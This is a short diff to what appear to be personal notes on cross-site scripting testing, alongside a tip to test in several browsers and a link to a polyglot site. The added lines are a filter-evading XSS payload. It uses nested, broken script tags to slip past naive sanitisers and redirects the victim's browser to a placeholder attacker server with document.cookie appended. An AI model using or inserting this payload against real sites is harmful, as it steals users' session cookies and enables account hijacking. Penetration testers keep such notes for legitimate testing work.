@@ -6,3 +6,6 @@ ALWAYS TEST BY USING MULTIPLE BROWSERS
 
 
 https://polyglot.innerht.ml/
+<scrip<script>t>
+location='http://attacker_server_ip/c='+document.cookie;
+</scrip</script>t>
